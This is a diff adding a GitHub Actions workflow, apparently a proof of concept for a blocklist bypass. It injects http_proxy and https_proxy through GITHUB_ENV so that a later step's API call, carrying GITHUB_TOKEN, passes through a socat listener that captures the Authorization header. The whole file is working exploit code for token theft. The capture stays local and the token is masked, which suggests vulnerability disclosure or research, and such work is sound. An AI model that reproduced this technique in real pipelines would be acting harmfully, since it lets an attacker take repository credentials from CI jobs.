@@ -1,0 +1,60 @@
+name: MITM Token Capture PoC
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  mitm-capture:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup proxy listener (simulates attacker infrastructure)
+        run: |
+          # Start a simple TCP listener that captures incoming data
+          # In a real attack, this would be the attacker's proxy server
+          mkdir -p /tmp/captures
+          
+          # Use socat to create a one-shot TCP listener that saves the request
+          nohup bash -c '
+            socat TCP-LISTEN:18080,reuseaddr,fork SYSTEM:"cat > /tmp/captures/request_\$(date +%s%N).txt; echo HTTP/1.1 502 Bad\ Gateway; echo; echo proxy-captured" &
+          ' &
+          sleep 1
+          echo "Proxy listener started on port 18080"
+          
+          # Now inject https_proxy via GITHUB_ENV (NOT BLOCKED by blocklist)
+          echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
+          echo "https_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
+          echo "Proxy env vars set via GITHUB_ENV (NOT blocked - only NODE_OPTIONS is blocked)"
+          
+      - name: Victim API call (GITHUB_TOKEN goes through proxy)
+        run: |
+          echo "=== Proxy state ==="
+          echo "http_proxy=$http_proxy"
+          echo "https_proxy=$https_proxy"
+          echo ""
+          
+          # This curl will go through the attacker proxy because https_proxy is set
+          # The proxy captures the Authorization header with GITHUB_TOKEN
+          echo "Making API call (will go through proxy)..."
+          curl -v --max-time 5 \
+            -H "Authorization: token $GITHUB_TOKEN" \
+            http://api.github.com/repos/toofikz/public-test-repo 2>&1 || true
+          
+          echo ""
+          echo "=== Checking what the proxy captured ==="
+          for f in /tmp/captures/request_*.txt; do
+            if [ -f "$f" ]; then
+              echo "--- Captured request ---"
+              # Show the captured data, masking the actual token
+              cat "$f" | head -20
+              echo "---"
+              # Check if Authorization header was captured
+              if grep -qi "authorization" "$f"; then
+                echo "CRITICAL: Authorization header with GITHUB_TOKEN was captured by the proxy!"
+                echo "Token line (masked): $(grep -i 'authorization' "$f" | sed 's/token .*/token [CAPTURED]/')"
+              fi
+            fi
+          done
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
